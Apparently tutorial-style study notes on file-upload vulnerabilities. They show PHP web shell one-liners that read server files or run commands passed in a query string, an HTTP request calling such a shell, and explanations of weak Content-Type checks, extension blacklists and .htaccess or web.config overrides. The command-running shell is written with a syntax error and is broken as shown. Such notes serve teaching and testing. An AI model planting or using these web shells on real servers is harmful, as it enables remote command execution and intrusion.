# Web Shell Upload

The following PHP one-liner can be used to read arbitrary files from the server's filesystem:
```php
<?php echo file_get_contents('/path/to/target/file'); ?>
```
While a more versatile web shell can be:
```php
<?php echo system($_GET['command']; ?)>
```
this enables to pass a system command via a query:
```http
GET /example/exploit.php?command=id HTTP/1.1
```

## 1. Flawed file type validation
When sending large amounts of binary data, the content type `multipart/form-data` is preferred.

*Example:*
```http
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```
Here each part has a `Content-Disposition` header that provides basin information about the input field, but they also contain their `Content-Type` whith tells the server the `MIME` type of the data.

Websites sometime try to validate file uploads by checking this `Content-Type` if it matches the expected `MIME` type. 

**Problems** may arise when the valie of this header is implicitly trusted by the server, and no further validation is performed to check if the contents match the supposed MIME type. 

## 2. Insufficient blacklisting of dangerous file types

Its *difficult* to block every possible file extension that can be dangerous, such as `.php5, .shtml`, etc.

### 2.1 Overriding the server configuration

Servers don't execute files unless they have been configured.

In order for Apache servers to execute PHP files requested by clients, devs have to add the following directives on the `/etc/apache2/apache2.conf` file:

```php
LoadModule php_module /usr/lib/apache2/module/libphp.so
    AddType application/x-httpd-php .php
```

Some servers also allow devs to create config files to override or add to the global settings.

On *Apache*, it will load *directory-specific* config files from the file `.htaccess` if it's present.

On *IIS* servers devs can make directory-specific configs using the `web.config` file, which may include directives as the floowing, that allows JSON files to be served to users:

```config
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
```

